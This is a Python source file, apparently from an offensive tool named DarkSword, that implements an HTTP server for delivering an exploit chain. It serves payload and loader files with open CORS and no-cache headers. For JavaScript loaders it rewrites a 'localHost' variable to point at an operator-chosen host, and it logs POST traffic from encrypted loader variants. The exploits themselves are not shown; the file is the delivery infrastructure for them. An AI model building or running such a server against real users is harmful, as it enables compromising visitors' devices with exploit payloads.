"""HTTP server for DarkSword exploit chain delivery."""

import re
from http.server import HTTPServer, SimpleHTTPRequestHandler
from pathlib import Path
from urllib.parse import urlparse
from typing import Optional

from .config import get_payloads_dir, get_templates_dir, ServeConfig


class DarkSwordHandler(SimpleHTTPRequestHandler):
    """Custom request handler for serving exploit chain with logging."""

    config: Optional[ServeConfig] = None
    payloads_dir: Path = get_payloads_dir()
    templates_dir: Path = get_templates_dir()

    def __init__(self, *args, directory: Optional[Path] = None, **kwargs):
        self.base_directory = directory or self.payloads_dir
        super().__init__(*args, directory=str(self.base_directory), **kwargs)

    def log_message(self, format: str, *args) -> None:
        """Override to use rich formatting and log all requests."""
        msg = format % args
        if "favicon" not in msg.lower():
            print(f"  [REQUEST] {msg}")

    def end_headers(self) -> None:
        """Add CORS and security headers for exploit delivery."""
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Cache-Control", "no-store, no-cache, must-revalidate")
        super().end_headers()

    def serve_file(self, path: Path, content_type: str = "application/octet-stream") -> bool:
        """Serve a file with optional content type."""
        try:
            with open(path, "rb") as f:
                content = f.read()

            if self.config and self.config.custom_host_in_loader and path.suffix == ".js":
                content_str = content.decode("utf-8", errors="replace")
                if "localHost" in content_str:
                    content_str = re.sub(
                        r'var localHost\s*=\s*"[^"]*"',
                        f'var localHost = "{self.config.custom_host_in_loader}"',
                        content_str,
                    )
                    content = content_str.encode("utf-8")

            self.send_response(200)
            self.send_header("Content-Type", content_type)
            self.send_header("Content-Length", str(len(content)))
            self.end_headers()
            self.wfile.write(content)
            return True
        except Exception as e:
            print(f"  [ERROR] Failed to serve {path}: {e}")
            return False

    def do_GET(self) -> None:
        """Handle GET requests - serve from payloads or templates."""
        parsed = urlparse(self.path)
        path = parsed.path.strip("/") or "index.html"
        if ".." in path:
            self.send_error(403, "Forbidden")
            return

        for base in [self.payloads_dir, self.templates_dir]:
            file_path = (base / path).resolve()
            if not str(file_path).startswith(str(base.resolve())):
                continue
            if file_path.exists() and file_path.is_file():
                break
        else:
            file_path = None

        if file_path and file_path.exists() and file_path.is_file():
            suffix = file_path.suffix.lower()
            content_types = {
                ".html": "text/html",
                ".js": "application/javascript",
                ".css": "text/css",
                ".json": "application/json",
            }
            content_type = content_types.get(suffix, "application/octet-stream")
            if self.serve_file(file_path, content_type):
                return

        super().do_GET()

    def do_POST(self) -> None:
        """Log POST requests (used by encrypted loader variants)."""
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length) if content_length else b""
        print(f"  [POST] {self.path} ({content_length} bytes)")
        self.send_response(404)
        self.end_headers()


def run_server(config: ServeConfig) -> None:
    """Start the exploit delivery HTTP server."""
    DarkSwordHandler.config = config
    DarkSwordHandler.payloads_dir = get_payloads_dir()
    DarkSwordHandler.templates_dir = get_templates_dir()

    server = HTTPServer((config.host, config.port), DarkSwordHandler)
    print(f"\n[*] DarkSword server listening on http://{config.host}:{config.port}")
    print(f"[*] Payloads: {get_payloads_dir()}")
    print(f"[*] Access: http://localhost:{config.port}/ or http://<IP>:{config.port}/")
    print("\n[!] Press Ctrl+C to stop\n")

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Server stopped.")
        server.shutdown()
